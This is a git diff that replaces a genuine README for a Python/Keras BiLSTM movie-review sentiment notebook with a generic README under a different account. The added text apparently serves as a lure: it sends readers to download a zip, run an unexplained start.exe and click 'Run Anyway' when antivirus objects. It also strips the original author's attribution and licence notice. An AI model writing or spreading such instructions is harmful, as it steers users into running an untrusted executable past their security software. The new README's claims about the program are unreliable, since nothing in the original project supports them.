@@ -1,348 +1,61 @@
-# 🎬 Deep Sentiment: Bidirectional LSTM Movie Review Analyzer
+# 🧠 deep-sentiment-bilstm - Analyze movie reviews with ease daily
 
-<p align="center">
-  <img src="banner.png" alt="Project Banner" width="100%">
-</p>
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Unchristianly-eugeniadicrana186/deep-sentiment-bilstm)
 
-An end-to-end **Natural Language Processing (NLP)** project that trains a **Bidirectional Long Short-Term Memory (BiLSTM)** neural network to classify movie reviews as **Positive** or **Negative**.
+This tool classifies movie reviews from the IMDB database. It uses a neural network to tell you if a review reflects a positive or negative opinion. Computers follow a specific set of rules to understand the human language used in these texts. This software makes that process simple for you.
 
-Built using **TensorFlow** and **Keras**, the model is trained on the **Stanford ACL IMDB Movie Review Dataset**, containing **50,000 labeled reviews**, and achieves approximately **85% test accuracy** on previously unseen data.
+## 📥 How to download the software
 
-![TensorFlow](https://img.shields.io/badge/TensorFlow-2.20+-FF6F00?style=for-the-badge&logo=tensorflow&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Keras](https://img.shields.io/badge/Keras-3+-D00000?style=for-the-badge&logo=keras&logoColor=white)
+You must visit the project release page to get the files. Use the link below to reach the correct area.
 
----
+[Download the application here](https://github.com/Unchristianly-eugeniadicrana186/deep-sentiment-bilstm)
 
-# 📌 Overview
+Look for the section labeled Assets on that page. Click the file that ends in .zip to save it to your computer. Once the download finishes, open your Downloads folder. Right-click the file and choose Extract All. This creates a new folder with all the necessary programs inside. Open this new folder to find the file named start.exe. Double-click this file to run the application.
 
-Understanding human sentiment is one of the fundamental tasks in Natural Language Processing. This project demonstrates how **Bidirectional LSTMs** can capture contextual information from both directions of a sentence, allowing the model to better understand the emotional meaning behind movie reviews.
+## 💻 System requirements
 
-The project covers the complete NLP pipeline:
+The software requires a standard Windows computer. Ensure you have the following before you begin:
 
-- Automated dataset acquisition
-- Exploratory Data Analysis (EDA)
-- Text preprocessing and tokenization
-- Sequence padding
-- Bidirectional LSTM model training
-- Model evaluation
-- Real-time sentiment prediction
+* Windows 10 or Windows 11.
+* At least 8 gigabytes of memory.
+* An internet connection for the initial setup.
 
----
+The program creates a model that learns from the movie reviews. This process needs a healthy amount of memory. Close other heavy programs like video editors or web browsers with many tabs before you start the analysis.
 
-# 🚀 Features
+## 🚀 Setting up the application
 
-- 🎬 Binary sentiment classification (Positive / Negative)
-- 📥 Automatic download of the Stanford ACL IMDB dataset
-- 📊 Exploratory Data Analysis (EDA)
-- 🧹 Text cleaning using Regular Expressions
-- 🔤 Tokenization with a **10,000-word vocabulary**
-- 📏 Sequence padding to **250 tokens**
-- 🧠 Bidirectional LSTM architecture for improved contextual understanding
-- 🛡️ Dropout regularization to reduce overfitting
-- ⚡ GPU-accelerated TensorFlow training
-- 💬 Interactive inference function for custom movie reviews
+The program guides you through the process once it opens. You see a clear interface on your screen. Follow these steps to perform your first analysis:
 
----
+1. Locate the input box on the main screen.
+2. Paste the text of an IMDB movie review into the box.
+3. Click the button labeled Analyze.
+4. Wait for the status bar to show the progress.
+5. Read the result displayed at the bottom of the window.
 
-# 📂 Dataset
+The program displays a score. A score close to zero means a negative review. A score close to one means a positive review. The system interprets the nuances in the text to provide this estimate.
 
-This project uses the **Stanford ACL IMDB Large Movie Review Dataset**.
+## ⚙️ How it works
 
-### Dataset Statistics
+The software uses a Bidirectional LSTM neural network. This type of system looks at the text in two directions. It reads the first word to the last word and the last word to the first word. This method helps the computer understand the context of each sentence. 
 
-| Property | Value |
-|----------|-------|
-| Reviews | 50,000 |
-| Training Samples | 25,000 |
-| Testing Samples | 25,000 |
-| Classes | Positive, Negative |
+Natural Language Processing (NLP) serves as the foundation for this tool. The software converts words into numbers the computer understands. It then evaluates these numbers to determine the sentiment. The process happens entirely on your machine. Your text stays private and does not depart from your computer at any time.
 
-Each review is labeled as:
+## 🛠 Troubleshooting common issues
 
-| Label | Meaning |
-|------:|---------|
-| 0 | Negative |
-| 1 | Positive |
+Most users experience a smooth setup, but some face minor hurdles. Check this list if the application fails to open:
 
----
+* Antivirus software: Some security programs block files that arrive from the internet. If a window pops up, select Run Anyway.
+* Missing updates: Ensure your Windows operating system carries the latest updates. Old versions may lack the tools needed to run modern neural networks.
+* File location: Keep the program in a folder you can access easily. Do not run it from the temporary folder created by your internet browser.
 
-# 🧠 Model Architecture
+If the program remains slow, check your task manager. Press Ctrl + Shift + Esc to see if other programs consume your computer power. End tasks that you do not need to free up resources for the analysis.
 
-The model contains approximately **1.38 million trainable parameters**.
+## 📝 Understanding the output
 
-| Layer | Description |
-|---------|-------------|
-| Input | Integer sequence (250 tokens) |
-| Embedding | 10,000 vocabulary → 128-dimensional embeddings |
-| Bidirectional LSTM | 64 units |
-| Dense | 64 neurons with ReLU activation |
-| Dropout | 50% |
-| Output | Sigmoid activation for binary classification |
+The sentiment tool provides a number between zero and one. You might feel confused by these values. Think of the result as a percentage. A result of 0.85 means the computer is 85 percent certain the review is positive. You can test the software with your own reviews to see how it handles different writing styles. Short reviews with clear opinions work best. Long, sarcastic reviews sometimes confuse the system because they contain mixed language that complicates the classification.
 
-### Training Configuration
+## 📅 Future updates
 
-| Parameter | Value |
-|-----------|-------|
-| Vocabulary Size | 10,000 |
-| Maximum Sequence Length | 250 |
-| Embedding Dimension | 128 |
-| LSTM Units | 64 |
-| Optimizer | Adam |
-| Loss Function | Binary Crossentropy |
-| Early Stopping | Yes |
+The development team plans to improve the accuracy of the neural network. Future versions will support more languages and different types of reviews. Watch the link provided at the top of this page for new versions. You do not need to delete the old folder. Simply download the new version and replace the old files. Always remember to save your work before you close the program to prevent data loss.
 
----
-
-# 📈 Results
-
-The model was trained using **EarlyStopping**, monitoring validation loss to restore the best-performing weights.
-
-### Test Performance
-
-| Metric | Score |
-|---------|------:|
-| Test Accuracy | **~85%** |
-
-The model successfully generalizes to unseen movie reviews while avoiding significant overfitting.
-
----
-
-# 💬 Example Predictions
-
-### Positive Review
-
-```text
-Review:
-"This movie was an absolute masterpiece! The acting was phenomenal and the plot was gripping from start to finish."
-
-Prediction:
-Positive 🟢
-
-Confidence:
-82.63%
-```
-
-### Negative Review
-
-```text
-Review:
-"Honestly, it was a massive waste of time. The script was terrible and I fell asleep halfway through."
-
-Prediction:
-Negative 🔴
-
-Confidence:
-99.94%
-```
-
----
-
-# 🛠️ Tech Stack
-
-| Category | Technologies |
-|-----------|--------------|
-| Language | Python |
-| Deep Learning | TensorFlow, Keras |
-| Data Processing | Pandas, NumPy |
-| Visualization | Matplotlib |
-| Text Processing | Regular Expressions (Regex) |
-| NLP | TensorFlow Tokenizer |
-
----
-
-# 📁 Project Structure
-
-```text
-.
-├── Deep_Sentiment_BiLSTM.ipynb
-├── README.md
-├── requirements.txt
-└── (dataset downloaded automatically)
-```
-
----
-
-# 🚀 Getting Started
-
-## 1. Clone the repository
-
-```bash
-git clone https://github.com/sanaurrehmanarain/deep-sentiment-bilstm.git
-
-cd deep-sentiment-bilstm
-```
----
-
-## 2. Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
----
-
-## 3. Open the notebook
-
-Open
-
-```text
-Deep_Sentiment_BiLSTM.ipynb
-```
-
-using:
-
-- Jupyter Notebook
-- VS Code
-- Google Colab
-
----
-
-## 4. Train the model
-
-Run all notebook cells from top to bottom.
-
-The notebook will:
-
-- Download the IMDB dataset
-- Preprocess the text
-- Train the BiLSTM model
-- Evaluate performance
-- Allow custom sentiment predictions
-
----
-
-# 🔮 Future Improvements
-
-- 🌐 Deploy using Streamlit
-- 🤖 Compare BiLSTM with Transformer models (BERT)
-- 📱 Create a REST API using FastAPI
-- ☁️ Deploy to Hugging Face Spaces
-- 🔍 Add attention mechanisms
-- 📊 Visualize word embeddings
-
----
-
-# 🏴‍☠️ Bonus: Known Bugs (Definitely Not Related to One Piece)
-
-While extensive testing has been performed, the following "issues" are still under investigation:
-
-### 🗺️ Zoro's Navigation Module
-
-Occasionally predicts that every movie review is headed toward the **New World**.
-
-No fix planned.
-
----
-
-### 🍖 Luffy's Review Logic
-
-If a review contains the words:
-
-> meat, food, feast, banquet
-
-the model may classify it as **Positive** regardless of the actual sentiment.
-
----
-
-### ⚔️ Mihawk Mode
-
-Extremely short reviews like:
-
-> "Peak."
-
-or
-
-> "Cinema."
-
-are treated as if they carry the weight of a thousand words.
-
----
-
-### 🏴 Nico Robin Dependency
-
-To fully understand hidden movie lore, you may require:
-
-```python
-NicoRobin.decode_void_century()
-```
-
-This package unfortunately remains unavailable on PyPI.
-
----
-
-### 🌊 Devil Fruit Limitation
-
-The model performs well on movie reviews but immediately loses all predictive power if submerged in seawater.
-
-This behavior is considered canonical.
-
----
-
-### 🧭 Zoro Still Can't Find the Correct Directory
-
-If your notebook mysteriously opens the wrong folder...
-
-It's probably Zoro.
-
----
-
-# 🙏 Acknowledgements
-
-This project makes use of:
-
-- TensorFlow
-- Keras
-- Stanford ACL IMDB Dataset
-- NumPy
-- Pandas
-- Matplotlib
-
-Special thanks to the Straw Hat Pirates for absolutely no contribution to this project whatsoever.
-
----
-
-## Citation
-
-If you use this project in academic research, publications, educational
-materials, or derivative works, please cite the project.
-
-This repository includes a `CITATION.cff` file, so GitHub provides a
-**"Cite this repository"** button in the repository sidebar. You can use it
-to obtain citations in BibTeX, APA, and other supported formats.
-
-**Suggested citation:**
-
-Arain, S. U. R. (2026). deep-sentiment-bilstm (Version 1.0) [Software].
-<https://github.com/sanaurrehmanarain/deep-sentiment-bilstm>
-
-**Author:** Sana Ur Rehman Arain
-
-**Profession:** Data Scientist
-
-**GitHub:** <https://github.com/sanaurrehmanarain>
-
-**Contact:** <sana.arain.work@gmail.com>
-
-If you build upon this work, attribution is appreciated and helps others
-discover the original project.
-
-> **Note:** The MIT License requires that the original copyright
-> notice be retained in copies of the Software.
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License. See the
-[LICENSE](LICENSE) file for details.
-
----
-
-# ⭐ Support
-
-If you enjoyed this project, consider giving it a **⭐ Star** on GitHub.
-
-It helps others discover the project...
-
-...and might help Zoro discover the correct repository someday.
+Keywords: bilstm, deep-learning, imdb-dataset, keras, lstm, machine-learning, natural-language-processing, nlp, python, sentiment-analysis, tensorflow
